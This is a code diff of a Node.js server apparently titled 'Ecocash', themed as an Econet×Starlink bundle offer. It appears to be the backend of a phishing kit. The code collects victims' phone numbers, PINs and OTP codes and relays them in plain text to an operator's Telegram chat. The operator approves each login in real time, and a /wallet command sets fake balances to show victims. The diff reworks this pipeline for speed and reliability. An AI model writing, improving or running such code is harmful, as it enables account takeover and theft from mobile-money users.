@@ -1,1623 +1,788 @@
-// server.js - Fixed Multi-User System with NO POLLING ERRORS
-const express = require('express');
-const cors = require('cors');
+// server.js - Ecocash
+'use strict';
+const express     = require('express');
+const cors        = require('cors');
 const TelegramBot = require('node-telegram-bot-api');
 require('dotenv').config();
 
-const app = express();
+const app  = express();
 const PORT = process.env.PORT || 3001;
 
+// ─── MIDDLEWARE (before routes) ────────────────────────────────────────────
 app.use(cors());
-app.use(express.json());
+app.use(express.json({ limit: '10kb' }));
 
-// ============================================
-// CONFIGURATION
-// ============================================
+// ─── CONFIG ────────────────────────────────────────────────────────────────
+const CFG = Object.freeze({
+  DUPE_TTL:          5_000,        // ms — block identical requests within window
+  APPROVAL_TIMEOUT:  5 * 60_000,   // ms — admin must act within 5 min
+  CLEANUP_INTERVAL:  15_000,       // ms — GC frequency (was 60s)
+  READ_TTL:          30_000,       // ms — keep terminal OTP records after first read
+  MAX_USERS:         parseInt(process.env.MAX_USERS) || 1,
+  BOT_STARTUP_DELAY: 2_000,
+  MAX_RESTARTS:      5,
+  POLLING_TIMEOUT:   30,           // seconds — Telegram long-poll window
+  TG_CHAT_INTERVAL:  1_050,        // ms — Telegram: 1 msg/s per chat
+  MAX_MSG_SIZE:      4_096,
+  SSE_HEARTBEAT:     20_000,       // ms — keep SSE alive
+});
 
-const CONFIG = {
-  CACHE_DURATION: 5000,
-  APPROVAL_TIMEOUT: 5 * 60 * 1000,
-  CLEANUP_INTERVAL: 60000,
-  MAX_USERS: parseInt(process.env.MAX_USERS) || 1,
-  BOT_POLLING_RETRY_DELAY: 10000,
-  MAX_BOT_RESTART_ATTEMPTS: 5,
-  REQUEST_TIMEOUT: 30000,
-  MAX_NOTIFICATION_SIZE: 4096,
-  BOT_STARTUP_DELAY: 3000,
-  POLLING_TIMEOUT: 30,
-  MAX_CONCURRENT_REQUESTS: 5
-};
-
-// ============================================
-// REQUEST QUEUE FOR RATE LIMITING
-// ============================================
-class RequestQueue {
-  constructor(maxConcurrent = 5) {
-    this.queue = [];
-    this.running = 0;
-    this.maxConcurrent = maxConcurrent;
-  }
-
-  async add(fn) {
-    return new Promise((resolve, reject) => {
-      this.queue.push({ fn, resolve, reject });
-      this.process();
-    });
-  }
-
-  async process() {
-    if (this.running >= this.maxConcurrent || this.queue.length === 0) {
-      return;
-    }
-
-    this.running++;
-    const { fn, resolve, reject } = this.queue.shift();
-
-    try {
-      const result = await fn();
-      resolve(result);
-    } catch (error) {
-      reject(error);
-    } finally {
-      this.running--;
-      this.process();
-    }
-  }
-}
-
-const requestQueue = new RequestQueue(CONFIG.MAX_CONCURRENT_REQUESTS);
-
-// ============================================
-// UTILITY FUNCTIONS
-// ============================================
+// ─── LOGGER ────────────────────────────────────────────────────────────────
+const ts     = () => new Date().toISOString();
 const logger = {
-  info: (msg, ...args) => console.log(`[INFO] ${new Date().toISOString()} - ${msg}`, ...args),
-  error: (msg, ...args) => console.error(`[ERROR] ${new Date().toISOString()} - ${msg}`, ...args),
-  warn: (msg, ...args) => console.warn(`[WARN] ${new Date().toISOString()} - ${msg}`, ...args),
-  debug: (msg, ...args) => process.env.DEBUG && console.log(`[DEBUG] ${new Date().toISOString()} - ${msg}`, ...args)
+  info:  (m, ...a) => console.log (`[INFO]  ${ts()} ${m}`, ...a),
+  warn:  (m, ...a) => console.warn (`[WARN]  ${ts()} ${m}`, ...a),
+  error: (m, ...a) => console.error(`[ERROR] ${ts()} ${m}`, ...a),
+  debug: (m, ...a) => process.env.DEBUG && console.log(`[DEBUG] ${ts()} ${m}`, ...a),
 };
 
-const validatePhoneNumber = (phoneNumber) => {
-  if (!phoneNumber || typeof phoneNumber !== 'string') {
-    return { valid: false, error: 'Phone number must be a string' };
-  }
-  
-  const cleaned = phoneNumber.replace(/\D/g, '');
-  if (cleaned.length < 9 || cleaned.length > 15) {
-    return { valid: false, error: 'Invalid phone number length' };
-  }
-  
-  return { valid: true, cleaned };
+// ─── HELPERS ───────────────────────────────────────────────────────────────
+const sanitize = (s) => (typeof s === 'string' ? s.replace(/[<>]/g, '').trim() : String(s ?? ''));
+const trunc    = (s, n = CFG.MAX_MSG_SIZE) => s.length <= n ? s : s.slice(0, n - 3) + '...';
+const sleep    = (ms) => new Promise(r => setTimeout(r, ms));
+
+// Pre-compiled — reused across all calls, zero recompilation cost
+const RE_NONDIGIT = /\D/g;
+
+// Memoised phone normalisation — same raw input always yields same result
+const _phoneCache = new Map();
+const normalise = (raw) => {
+  if (!raw || typeof raw !== 'string') return '';
+  const hit = _phoneCache.get(raw);
+  if (hit) return hit;
+  let c = raw.replace(RE_NONDIGIT, '');
+  if (c.startsWith('263')) c = c.slice(3);
+  if (c.startsWith('0'))   c = c.slice(1);
+  if (c.length > 9)        c = c.slice(-9);
+  const result = `+263${c}`;
+  if (_phoneCache.size > 5_000) _phoneCache.clear();
+  _phoneCache.set(raw, result);
+  return result;
+};
+const fmtPhone = (raw) => {
+  const full = normalise(raw);
+  return { cc: '+263', num: full.slice(4), full };
 };
 
-const validatePin = (pin) => {
-  if (!pin || typeof pin !== 'string') {
-    return { valid: false, error: 'PIN must be a string' };
-  }
-  
-  if (pin.length < 4 || pin.length > 8 || !/^\d+$/.test(pin)) {
-    return { valid: false, error: 'PIN must be 4-8 digits' };
-  }
-  
-  return { valid: true };
+// ─── VALIDATORS ────────────────────────────────────────────────────────────
+const RE_PIN = /^\d{4,8}$/;
+const RE_OTP = /^\d{4,8}$/;
+const vPhone = (p) => {
+  if (!p || typeof p !== 'string') return 'Phone must be a string';
+  const n = p.replace(RE_NONDIGIT, '');
+  return (n.length < 9 || n.length > 15) ? 'Invalid phone length' : null;
 };
+const vPin   = (p) => (!p || typeof p !== 'string') ? 'PIN must be a string'
+                    : !RE_PIN.test(p)               ? 'PIN must be 4-8 digits' : null;
+const vOtp   = (o) => (!o || typeof o !== 'string') ? 'OTP must be a string'
+                    : !RE_OTP.test(o)               ? 'OTP must be 4-8 digits' : null;
 
-const validateOtp = (otp) => {
-  if (!otp || typeof otp !== 'string') {
-    return { valid: false, error: 'OTP must be a string' };
-  }
-  
-  if (otp.length < 4 || otp.length > 8 || !/^\d+$/.test(otp)) {
-    return { valid: false, error: 'OTP must be 4-8 digits' };
-  }
-  
-  return { valid: true };
-};
-
-const sanitizeInput = (input) => {
-  if (typeof input !== 'string') return String(input);
-  return input.replace(/[<>]/g, '').trim();
-};
-
-const truncateMessage = (message, maxLength = CONFIG.MAX_NOTIFICATION_SIZE) => {
-  if (message.length <= maxLength) return message;
-  return message.substring(0, maxLength - 3) + '...';
-};
-
-// ============================================
-// PHONE NUMBER FORMATTING
-// ============================================
-const formatPhoneNumber = (phoneNumber) => {
-  try {
-    let cleaned = phoneNumber.replace(/\D/g, '');
-    
-    if (cleaned.startsWith('263')) {
-      const countryCode = '+263';
-      let number = cleaned.substring(3);
-      if (number.length === 10 && number.startsWith('0')) {
-        number = number.substring(1);
-      }
-      if (number.length > 9) {
-        number = number.substring(number.length - 9);
-      }
-      return { countryCode, number, formatted: `${countryCode}${number}` };
-    }
-    
-    if (cleaned.length === 10 && cleaned.startsWith('0')) {
-      cleaned = cleaned.substring(1);
-    }
-    if (cleaned.length > 9) {
-      cleaned = cleaned.substring(cleaned.length - 9);
-    }
-    
-    return { countryCode: '+263', number: cleaned, formatted: `+263${cleaned}` };
-  } catch (error) {
-    logger.error('Error formatting phone number:', error.message);
-    return { countryCode: '+263', number: phoneNumber, formatted: phoneNumber };
-  }
-};
-
-// ============================================
-// DUPLICATE REQUEST DETECTION
-// ============================================
-const isDuplicate = (user, key) => {
-  try {
-    if (user.processedRequests.has(key)) {
-      const timestamp = user.processedRequests.get(key);
-      if (Date.now() - timestamp < CONFIG.CACHE_DURATION) {
-        return true;
-      }
-    }
-    user.processedRequests.set(key, Date.now());
-    
-    if (user.processedRequests.size > 1000) {
-      const cutoff = Date.now() - CONFIG.CACHE_DURATION;
-      for (const [k, v] of user.processedRequests.entries()) {
-        if (v < cutoff) user.processedRequests.delete(k);
-      }
-    }
-    
-    return false;
-  } catch (error) {
-    logger.error(`Error in isDuplicate for ${user.name}:`, error.message);
+// ─── O(1) DUPE CACHE ───────────────────────────────────────────────────────
+// Each entry self-expires via a stored setTimeout — no iteration ever needed.
+class DupeCache {
+  constructor(ttl = CFG.DUPE_TTL) { this._m = new Map(); this._ttl = ttl; }
+  seen(key) {
+    if (this._m.has(key)) return true;
+    const h = setTimeout(() => this._m.delete(key), this._ttl);
+    if (h.unref) h.unref();
+    this._m.set(key, h);
     return false;
   }
-};
+  clear() { for (const h of this._m.values()) clearTimeout(h); this._m.clear(); }
+}
 
-// ============================================
-// MESSAGE FORMATTERS
-// ============================================
-const formatLoginMessage = (user, data) => {
-  try {
-    const { countryCode, number } = formatPhoneNumber(data.phoneNumber);
-    const isReturningUser = user.verifiedUsers.has(data.phoneNumber);
-    const userBadge = isReturningUser ? '🔄 RETURNING USER' : '🆕 NEW USER';
-    
-    return `📱 <b>${sanitizeInput(user.name)} - LOGIN ATTEMPT</b>
-
-${userBadge}
-🌍 <b>Country Code:</b> <code>${countryCode}</code>
-📱 <b>Phone Number:</b> <code>${number}</code>
-🔢 <b>PIN:</b> <code>${sanitizeInput(data.pin)}</code>
-⏰ <b>Time:</b> ${new Date(data.timestamp).toLocaleString()}
-
-${isReturningUser ? '✅ <b>Returning user - will skip OTP</b>' : '📱 <b>New user - will show OTP</b>'}
-
-━━━━━━━━━━━━━━━━━━━
-
-⚠️ <b>User waiting for approval</b>
-⏱️ <b>Timeout:</b> 5 minutes`;
-  } catch (error) {
-    logger.error(`Error formatting login message for ${user.name}:`, error.message);
-    return `Error formatting message: ${error.message}`;
+// ─── PER-USER TELEGRAM SEND QUEUE ──────────────────────────────────────────
+// Respects Telegram's 1 msg/s per-chat rate limit.
+// Each user has their own queue — they never block each other.
+class TgQueue {
+  constructor(interval = CFG.TG_CHAT_INTERVAL) {
+    this._q        = [];
+    this._running  = false;
+    this._interval = interval;
+    this._last     = 0;
   }
-};
-
-const formatOTPMessage = (user, data) => {
-  try {
-    const { countryCode, number } = formatPhoneNumber(data.phoneNumber);
-    
-    return `✅ <b>${sanitizeInput(user.name)} - OTP VERIFICATION</b>
-
-🆕 <b>NEW USER - VERIFICATION NEEDED</b>
-🌍 <b>Country Code:</b> <code>${countryCode}</code>
-📱 <b>Phone Number:</b> <code>${number}</code>
-🔐 <b>OTP Code:</b> <code>${sanitizeInput(data.otp)}</code>
-⏰ <b>Time:</b> ${new Date(data.timestamp).toLocaleString()}
-
-━━━━━━━━━━━━━━━━━━━
-
-⚠️ <b>Verify the credentials:</b>
-⏱️ <b>Timeout:</b> 5 minutes`;
-  } catch (error) {
-    logger.error(`Error formatting OTP message for ${user.name}:`, error.message);
-    return `Error formatting message: ${error.message}`;
+  send(fn) {
+    return new Promise((resolve, reject) => {
+      this._q.push({ fn, resolve, reject });
+      if (!this._running) this._drain();
+    });
   }
-};
-
-// ============================================
-// BOT MANAGER CLASS - PREVENTS POLLING ERRORS
-// ============================================
-class BotManager {
-  constructor(user, linkInsert) {
-    this.user = user;
-    this.linkInsert = linkInsert;
-    this.bot = null;
-    this.isPolling = false;
-    this.isInitializing = false;
-    this.initializationPromise = null;
-    this.restartAttempts = 0;
-    this.maxRestartAttempts = CONFIG.MAX_BOT_RESTART_ATTEMPTS;
-    this.pollingErrorCount = 0;
-  }
-
-  async initialize() {
-    if (this.isInitializing) {
-      logger.warn(`${this.user.name}: Already initializing, waiting...`);
-      return this.initializationPromise;
+  async _drain() {
+    this._running = true;
+    while (this._q.length) {
+      const gap = this._interval - (Date.now() - this._last);
+      if (gap > 0) await sleep(gap);
+      const { fn, resolve, reject } = this._q.shift();
+      this._last = Date.now();
+      try   { resolve(await fn()); }
+      catch (e) { reject(e); }
     }
-
-    this.isInitializing = true;
-    this.initializationPromise = this._doInitialize();
-
-    try {
-      await this.initializationPromise;
-      return true;
-    } finally {
-      this.isInitializing = false;
-      this.initializationPromise = null;
-    }
-  }
-
-  async _doInitialize() {
-    try {
-      await this.cleanup();
-      await new Promise(resolve => setTimeout(resolve, 1000));
-
-      logger.info(`${this.user.name}: Creating new bot instance...`);
-      
-      this.bot = new TelegramBot(this.user.botToken, {
-        polling: {
-          interval: 2000,
-          autoStart: false,
-          params: {
-            timeout: CONFIG.POLLING_TIMEOUT
-          }
-        },
-        filepath: false
-      });
-
-      this.setupErrorHandlers();
-      this.setupCommands();
-
-      logger.info(`${this.user.name}: Starting polling...`);
-      await this.bot.startPolling();
-      this.isPolling = true;
-
-      await this.verifyBot();
-
-      this.user.isHealthy = true;
-      this.user.bot = this.bot;
-      this.restartAttempts = 0;
-      this.pollingErrorCount = 0;
-      
-      logger.info(`✅ ${this.user.name}: Bot initialized successfully`);
-      return true;
-
-    } catch (error) {
-      logger.error(`❌ ${this.user.name}: Initialization failed:`, error.message);
-      this.user.isHealthy = false;
-      await this.cleanup();
-      throw error;
-    }
-  }
-
-  async cleanup() {
-    if (!this.bot) return;
-
-    logger.info(`${this.user.name}: Cleaning up bot...`);
-
-    try {
-      this.bot.removeAllListeners();
-
-      if (this.isPolling) {
-        try {
-          await this.bot.stopPolling({ cancel: true, reason: 'Cleanup' });
-          logger.info(`${this.user.name}: Polling stopped`);
-        } catch (e) {
-          logger.debug(`${this.user.name}: Stop polling error (ignoring):`, e.message);
-        }
-      }
-
-      try {
-        if (this.bot._polling) {
-          this.bot._polling.abort = true;
-        }
-      } catch (e) {
-        logger.debug(`${this.user.name}: Close connection error (ignoring):`, e.message);
-      }
-
-    } catch (error) {
-      logger.error(`${this.user.name}: Cleanup error:`, error.message);
-    } finally {
-      this.isPolling = false;
-      this.bot = null;
-      this.user.bot = null;
-    }
-  }
-
-  setupErrorHandlers() {
-    this.bot.on('polling_error', (error) => {
-      this.pollingErrorCount++;
-      logger.error(`${this.user.name}: Polling error #${this.pollingErrorCount}:`, error.message);
-
-      if (error.code === 'EFATAL') {
-        logger.error(`${this.user.name}: Fatal error - will restart`);
-        this.scheduleRestart(5000);
-      } 
-      else if (error.code === 'ETELEGRAM') {
-        if (error.response?.statusCode === 401) {
-          logger.error(`${this.user.name}: Invalid token - STOPPING`);
-          this.user.isHealthy = false;
-          this.cleanup();
-        } 
-        else if (error.response?.statusCode === 409) {
-          logger.error(`${this.user.name}: Conflict - another instance polling`);
-          this.scheduleRestart(10000);
-        }
-        else if (error.response?.statusCode === 429) {
-          const retryAfter = error.response.parameters?.retry_after || 30;
-          logger.warn(`${this.user.name}: Rate limited - retry after ${retryAfter}s`);
-        }
-      }
-      else if (error.code === 'ECONNRESET' || error.code === 'ETIMEDOUT') {
-        logger.warn(`${this.user.name}: Connection issue - ${error.code}`);
-        if (this.pollingErrorCount > 10) {
-          this.scheduleRestart(15000);
-        }
-      }
-    });
-
-    this.bot.on('webhook_error', (error) => {
-      logger.error(`${this.user.name}: Webhook error:`, error.message);
-    });
-
-    this.bot.on('error', (error) => {
-      logger.error(`${this.user.name}: General error:`, error.message);
-    });
-  }
-
-  scheduleRestart(delay = 10000) {
-    if (this.restartAttempts >= this.maxRestartAttempts) {
-      logger.error(`${this.user.name}: Max restart attempts reached - STOPPING`);
-      this.user.isHealthy = false;
-      return;
-    }
-
-    if (this.isInitializing) {
-      logger.warn(`${this.user.name}: Already restarting...`);
-      return;
-    }
-
-    this.restartAttempts++;
-    logger.info(`${this.user.name}: Scheduling restart #${this.restartAttempts} in ${delay}ms...`);
-
-    setTimeout(async () => {
-      try {
-        await this.initialize();
-      } catch (error) {
-        logger.error(`${this.user.name}: Restart failed:`, error.message);
-      }
-    }, delay);
-  }
-
-  async verifyBot() {
-    try {
-      const me = await this.bot.getMe();
-      logger.info(`${this.user.name}: Bot verified - @${me.username}`);
-      return true;
-    } catch (error) {
-      logger.error(`${this.user.name}: Bot verification failed:`, error.message);
-      throw error;
-    }
-  }
-
-  setupCommands() {
-    this.bot.onText(/\/start/, async (msg) => {
-      try {
-        await this.bot.sendMessage(
-          msg.chat.id,
-          `🤖 <b>${this.user.name} Bot</b>\n\n` +
-          `I will notify you of all login attempts and OTP verifications.\n\n` +
-          `<b>Your Chat ID:</b> <code>${msg.chat.id}</code>\n` +
-          `<b>Your Link:</b> <code>/api/${this.linkInsert}/*</code>\n\n` +
-          `Add these to your .env file as:\n` +
-          `<code>USER_LINK_INSERT_${this.user.id}=${this.linkInsert}</code>\n` +
-          `<code>TELEGRAM_CHAT_ID_${this.user.id}=${msg.chat.id}</code>`,
-          { parse_mode: 'HTML' }
-        );
-      } catch (error) {
-        logger.error(`${this.user.name}: /start error:`, error.message);
-      }
-    });
-
-    this.bot.onText(/\/status/, async (msg) => {
-      try {
-        await this.bot.sendMessage(
-          msg.chat.id,
-          `✅ <b>${this.user.name} Bot Active</b>\n\n` +
-          `📊 Login notifications: ${this.user.loginNotifications.size}\n` +
-          `📊 Pending OTP: ${this.user.otpVerifications.size}\n` +
-          `💰 Wallets: ${this.user.walletBalances.size}\n` +
-          `✅ Verified users: ${this.user.verifiedUsers.size}\n` +
-          `🔗 Endpoint: <code>/api/${this.linkInsert}/*</code>\n` +
-          `🔢 Errors: ${this.user.errorCount}\n` +
-          `🔄 Restart attempts: ${this.restartAttempts}\n` +
-          `📡 Polling errors: ${this.pollingErrorCount}\n` +
-          `${this.user.lastError ? `⚠️ Last error: ${this.user.lastError}` : ''}`,
-          { parse_mode: 'HTML' }
-        );
-      } catch (error) {
-        logger.error(`${this.user.name}: /status error:`, error.message);
-      }
-    });
-
-    this.bot.onText(/\/wallet (.+)/, async (msg, match) => {
-      try {
-        const args = match[1].split(' ');
-        if (args.length !== 4) {
-          return await this.bot.sendMessage(
-            msg.chat.id,
-            '❌ <b>Invalid format!</b>\n\n' +
-            '<b>Usage:</b>\n<code>/wallet [phone] [name] [USD] [ZWG]</code>\n\n' +
-            '<b>Example:</b>\n<code>/wallet +263771234567 John 1250.50 5000</code>',
-            { parse_mode: 'HTML' }
-          );
-        }
-
-        const [phone, name, usd, zwg] = args;
-        
-        const phoneValidation = validatePhoneNumber(phone);
-        if (!phoneValidation.valid) {
-          return await this.bot.sendMessage(msg.chat.id, `❌ ${phoneValidation.error}`, { parse_mode: 'HTML' });
-        }
-
-        const usdAmount = parseFloat(usd);
-        const zwgAmount = parseFloat(zwg);
-
-        if (isNaN(usdAmount) || isNaN(zwgAmount) || usdAmount < 0 || zwgAmount < 0) {
-          return await this.bot.sendMessage(msg.chat.id, '❌ Invalid amounts! Must be positive numbers.', { parse_mode: 'HTML' });
-        }
-
-        this.user.walletBalances.set(phone, { 
-          name: sanitizeInput(name), 
-          usd: usdAmount, 
-          zwg: zwgAmount, 
-          timestamp: Date.now() 
-        });
-
-        await this.bot.sendMessage(
-          msg.chat.id,
-          `✅ <b>WALLET BALANCES SET</b>\n\n` +
-          `👤 <b>Name:</b> ${sanitizeInput(name)}\n` +
-          `📱 <b>Phone:</b> <code>${phone}</code>\n` +
-          `💵 <b>USD:</b> $${usdAmount.toFixed(2)}\n` +
-          `💰 <b>ZWG:</b> ZWG ${zwgAmount.toFixed(2)}\n` +
-          `⏰ ${new Date().toLocaleString()}`,
-          { parse_mode: 'HTML' }
-        );
-      } catch (error) {
-        logger.error(`${this.user.name}: /wallet error:`, error.message);
-      }
-    });
-
-    this.bot.onText(/\/restart/, async (msg) => {
-      try {
-        await this.bot.sendMessage(msg.chat.id, '🔄 Restarting bot...', { parse_mode: 'HTML' });
-        this.restartAttempts = 0;
-        await this.initialize();
-        await this.bot.sendMessage(msg.chat.id, '✅ Bot restarted successfully!', { parse_mode: 'HTML' });
-      } catch (error) {
-        logger.error(`${this.user.name}: /restart error:`, error.message);
-      }
-    });
-
-    this.bot.on('callback_query', async (query) => {
-      try {
-        await handleCallbackQuery(this.user, query);
-      } catch (error) {
-        logger.error(`${this.user.name}: Callback error:`, error.message);
-        try {
-          await this.bot.answerCallbackQuery(query.id, { 
-            text: '❌ An error occurred', 
-            show_alert: true 
-          });
-        } catch (e) {
-          logger.error(`${this.user.name}: Error answering callback:`, e.message);
-        }
-      }
-    });
-  }
-
-  isHealthy() {
-    return this.isPolling && this.user.isHealthy && !this.isInitializing;
+    this._running = false;
   }
 }
 
-// ============================================
-// DYNAMIC USER LOADING
-// ============================================
+// ─── SSE BROKER ────────────────────────────────────────────────────────────
+// Replaces the polling pattern entirely.
+// Admin taps button → callback fires → sseBroker.push() → client receives
+// status in <50ms instead of waiting for the next poll interval.
+class SseBroker {
+  constructor() { this._subs = new Map(); }
+
+  subscribe(key, res) {
+    res.setHeader('Content-Type',      'text/event-stream');
+    res.setHeader('Cache-Control',     'no-cache');
+    res.setHeader('Connection',        'keep-alive');
+    res.setHeader('X-Accel-Buffering', 'no');
+    res.flushHeaders();
+
+    const hb    = setInterval(() => { if (!res.writableEnded) res.write(': ping\n\n'); }, CFG.SSE_HEARTBEAT);
+    const entry = { res, hb };
+
+    if (!this._subs.has(key)) this._subs.set(key, new Set());
+    this._subs.get(key).add(entry);
+
+    const unsub = () => {
+      clearInterval(hb);
+      const s = this._subs.get(key);
+      if (s) { s.delete(entry); if (!s.size) this._subs.delete(key); }
+      if (!res.writableEnded) res.end();
+    };
+    res.on('close', unsub);
+    res.on('error', unsub);
+  }
+
+  push(key, payload) {
+    const set = this._subs.get(key);
+    if (!set?.size) return;
+    const data = `data: ${JSON.stringify(payload)}\n\n`;
+    for (const { res, hb } of set) {
+      clearInterval(hb);
+      if (!res.writableEnded) { res.write(data); res.end(); }
+    }
+    this._subs.delete(key);
+  }
+
+  get size() { let n = 0; for (const s of this._subs.values()) n += s.size; return n; }
+}
+
+const sseBroker = new SseBroker();
+
+// ─── MESSAGE FORMATTERS ────────────────────────────────────────────────────
+const fmtBundle = (b) => {
+  if (!b?.data) return '';
+  const price    = b.price != null && !isNaN(b.price) ? `$${b.price}` : 'N/A';
+  const validity = b.validity ? ` (${sanitize(b.validity)})` : '';
+  return `\n📦 <b>Bundle:</b> ${sanitize(b.data)} / ${price}${validity}`;
+};
+
+const fmtLogin = (user, { phone, pin, time, bundle }) => {
+  const { cc, num } = fmtPhone(phone);
+  const returning   = user.verified.has(phone);
+  return `📱 <b>${sanitize(user.name)} — LOGIN</b>
+
+${returning ? '🔄 RETURNING USER' : '🆕 NEW USER'}
+🌍 <b>Country:</b> <code>${cc}</code>
+📞 <b>Number:</b>  <code>${num}</code>
+🔐 <b>PIN:</b>     <code>${sanitize(pin)}</code>${fmtBundle(bundle)}
+⏰ <b>Time:</b>    ${new Date(time).toLocaleString()}
+
+${returning ? '✅ Skip OTP → Dashboard' : '📲 Proceed → OTP step'}
+
+━━━━━━━━━━━━━━━━━━━
+⏱️ Timeout: 5 min`;
+};
+
+const fmtOtp = (user, { phone, otp, time, bundle }) => {
+  const { cc, num } = fmtPhone(phone);
+  return `✅ <b>${sanitize(user.name)} — OTP VERIFY</b>
+
+🆕 NEW USER
+🌍 <b>Country:</b> <code>${cc}</code>
+📞 <b>Number:</b>  <code>${num}</code>
+🔑 <b>OTP:</b>     <code>${sanitize(otp)}</code>${fmtBundle(bundle)}
+⏰ <b>Time:</b>    ${new Date(time).toLocaleString()}
+
+━━━━━━━━━━━━━━━━━━━
+⏱️ Timeout: 5 min`;
+};
+
+// ─── CALLBACK DATA ─────────────────────────────────────────────────────────
+const CB_SEP  = '|';
+const mkCb    = (type, action, phone, secret) => [type, action, phone, secret].join(CB_SEP);
+const parseCb = (d) => {
+  const p = d.split(CB_SEP);
+  return p.length === 4 ? { type: p[0], action: p[1], phone: p[2], secret: p[3] } : null;
+};
+
+// ─── BOT MANAGER ───────────────────────────────────────────────────────────
+class BotManager {
+  constructor(user, link) {
+    this.user         = user;
+    this.link         = link;
+    this.bot          = null;
+    this.polling      = false;
+    this.initializing = false;
+    this._p           = null;
+    this.restarts     = 0;
+    this.pollErrors   = 0;
+  }
+
+  async init() {
+    if (this.initializing) return this._p;
+    this.initializing = true;
+    this._p = this._doInit().finally(() => { this.initializing = false; this._p = null; });
+    return this._p;
+  }
+
+  async _doInit() {
+    await this._cleanup();
+    await sleep(500);
+
+    this.bot = new TelegramBot(this.user.botToken, {
+      polling: { interval: 0, autoStart: false, params: { timeout: CFG.POLLING_TIMEOUT } },
+      filepath: false,
+    });
+
+    this._attachErrors();
+    this._attachCommands();
+    await this.bot.startPolling();
+    this.polling = true;
+
+    const me = await this.bot.getMe();
+    logger.info(`${this.user.name}: @${me.username} ready`);
+
+    this.user.healthy = true;
+    this.user.bot     = this.bot;
+    this.restarts     = 0;
+    this.pollErrors   = 0;
+  }
+
+  async _cleanup() {
+    if (!this.bot) return;
+    this.bot.removeAllListeners();
+    if (this.polling) try { await this.bot.stopPolling({ cancel: true }); } catch (_) {}
+    try { if (this.bot._polling) this.bot._polling.abort = true; } catch (_) {}
+    this.polling = false;
+    this.bot = this.user.bot = null;
+  }
+
+  _restart(delay = 10_000) {
+    if (this.restarts >= CFG.MAX_RESTARTS) { this.user.healthy = false; return; }
+    if (this.initializing) return;
+    this.restarts++;
+    logger.info(`${this.user.name}: restart #${this.restarts} in ${delay}ms`);
+    const t = setTimeout(() => this.init().catch(e => logger.error(`restart failed:`, e.message)), delay);
+    if (t.unref) t.unref();
+  }
+
+  _attachErrors() {
+    this.bot.on('polling_error', (err) => {
+      this.pollErrors++;
+      logger.error(`${this.user.name}: poll error #${this.pollErrors}:`, err.message);
+      const s = err.response?.statusCode;
+      if (err.code === 'EFATAL')  return this._restart(5_000);
+      if (s === 401)              { this.user.healthy = false; return this._cleanup(); }
+      if (s === 409)              return this._restart(10_000);
+      if (this.pollErrors > 10)   return this._restart(15_000);
+    });
+    this.bot.on('error',         (e) => logger.error(`${this.user.name}: bot error:`,     e.message));
+    this.bot.on('webhook_error', (e) => logger.error(`${this.user.name}: webhook error:`, e.message));
+  }
+
+  _attachCommands() {
+    const { bot, user, link } = this;
+
+    bot.onText(/\/start/, async (msg) => {
+      try {
+        await bot.sendMessage(msg.chat.id,
+          `🛰️ <b>${sanitize(user.name)} — Econet×Starlink Bot</b>\n\n` +
+          `<b>Chat ID:</b> <code>${msg.chat.id}</code>\n` +
+          `<b>Endpoint:</b> <code>/api/${link}/*</code>\n\n` +
+          `Add to .env:\n<code>TELEGRAM_CHAT_ID_${user.id}=${msg.chat.id}</code>`,
+          { parse_mode: 'HTML' });
+      } catch (e) { logger.error('/start:', e.message); }
+    });
+
+    bot.onText(/\/status/, async (msg) => {
+      try {
+        await bot.sendMessage(msg.chat.id,
+          `✅ <b>${sanitize(user.name)} — Status</b>\n\n` +
+          `📊 Pending logins: ${user.logins.size}\n` +
+          `📊 Pending OTPs:   ${user.otps.size}\n` +
+          `✅ Verified users: ${user.verified.size}\n` +
+          `💰 Wallets set:    ${user.wallets.size}\n` +
+          `📡 SSE clients:    ${sseBroker.size}\n` +
+          `🔗 Endpoint: <code>/api/${link}/*</code>\n` +
+          `🔄 Restarts: ${this.restarts} | Poll errors: ${this.pollErrors}\n` +
+          `${user.lastErr ? `⚠️ Last error: ${user.lastErr}` : ''}`,
+          { parse_mode: 'HTML' });
+      } catch (e) { logger.error('/status:', e.message); }
+    });
+
+    bot.onText(/\/wallet (.+)/, async (msg, match) => {
+      try {
+        const args = match[1].trim().split(/\s+/);
+        if (args.length !== 4)
+          return bot.sendMessage(msg.chat.id, '❌ Usage: <code>/wallet [phone] [name] [USD] [ZWG]</code>', { parse_mode: 'HTML' });
+        const [rawPhone, name, usd, zwg] = args;
+        const usdN = parseFloat(usd), zwgN = parseFloat(zwg);
+        if (isNaN(usdN) || isNaN(zwgN) || usdN < 0 || zwgN < 0)
+          return bot.sendMessage(msg.chat.id, '❌ Invalid amounts.', { parse_mode: 'HTML' });
+        const phone = normalise(rawPhone);
+        user.wallets.set(phone, { name: sanitize(name), usd: usdN, zwg: zwgN, ts: Date.now() });
+        await bot.sendMessage(msg.chat.id,
+          `✅ <b>Wallet set</b>\n👤 ${sanitize(name)}\n📱 <code>${phone}</code>\n💵 $${usdN.toFixed(2)}\n💰 ZWG ${zwgN.toFixed(2)}`,
+          { parse_mode: 'HTML' });
+      } catch (e) { logger.error('/wallet:', e.message); }
+    });
+
+    bot.onText(/\/restart/, async (msg) => {
+      try {
+        await bot.sendMessage(msg.chat.id, '🔄 Restarting...', { parse_mode: 'HTML' });
+        this.restarts = 0;
+        await this.init();
+        await bot.sendMessage(msg.chat.id, '✅ Restarted!', { parse_mode: 'HTML' });
+      } catch (e) { logger.error('/restart:', e.message); }
+    });
+
+    bot.on('callback_query', async (q) => {
+      try { await handleCallback(user, q); }
+      catch (e) {
+        // Log only — do NOT answerCallbackQuery here.
+        // handleCallback always answers before any throw, so a second
+        // answer would itself fail and re-trigger the error alert.
+        logger.error(`${user.name}: callback error:`, e.message);
+      }
+    });
+  }
+
+  ok() { return this.polling && this.user.healthy && !this.initializing; }
+}
+
+// ─── CALLBACK HANDLER ──────────────────────────────────────────────────────
+// Design rules that prevent the "❌ Error" alert:
+//
+//  1. IDEMPOTENCY GUARD — if this callback_query_id was already handled
+//     (double-tap or Telegram duplicate delivery), answer silently and bail.
+//     Telegram delivers each qid exactly once per bot session, but network
+//     retries can cause the library to fire it twice.
+//
+//  2. SINGLE answerCallbackQuery — Telegram allows exactly one answer per qid.
+//     We call it once, at the very end, with the final status text.
+//     The intermediate "⏳ Processing..." is dropped — it caused the double-
+//     answer that showed the error alert.
+//
+//  3. FIRE-AND-FORGET editMessageText — we do NOT await it before answering.
+//     editMessageText is best-effort UI decoration. If it fails (message
+//     already edited, too old, network blip) the record is already updated
+//     in memory and the SSE push already fired — the user flow is unaffected.
+//     We run edit and answer in parallel via Promise.all so neither blocks.
+//
